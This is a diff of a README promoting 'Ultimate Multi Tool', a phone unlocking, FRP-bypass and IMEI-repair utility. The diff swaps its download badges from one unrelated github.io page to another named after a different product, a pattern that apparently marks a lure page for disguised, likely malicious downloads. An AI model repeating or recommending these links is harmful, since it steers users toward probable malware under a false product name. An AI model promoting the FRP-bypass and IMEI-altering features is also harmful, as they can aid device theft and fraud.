@@ -2,7 +2,7 @@
 
 Ultimate Multi Tool (UMT) is a versatile and powerful software designed for mobile phone technicians and repair centers. It offers a comprehensive set of features including unlocking, flashing, FRP bypass, IMEI repair, and much more, supporting a wide range of smartphone brands and models.
 
-[![Download Ultimate Multi Tool](https://img.shields.io/badge/Download-Ultimate%20Multi%20Tool-blueviolet)](https://asdeennerhorse.github.io/mogus/ultimate)
+[![Download Ultimate Multi Tool](https://img.shields.io/badge/Download-Ultimate%20Multi%20Tool-blueviolet)](https://hikvision-ivms-5200-desktop-app.github.io/.github)
 
 ---
 
@@ -35,7 +35,7 @@ Ultimate Multi Tool (UMT) is a versatile and powerful software designed for mobi
 - Repair IMEI to restore network functionality  
 - Serve customers quickly in mobile repair shops  
 
-[![Download Ultimate Multi Tool](https://img.shields.io/badge/Download-Ultimate%20Multi%20Tool-blueviolet)](https://asdeennerhorse.github.io/mogus/ultimate)
+[![Download Ultimate Multi Tool](https://img.shields.io/badge/Download-Ultimate%20Multi%20Tool-blueviolet)](https://hikvision-ivms-5200-desktop-app.github.io/.github)
 
 ---
 
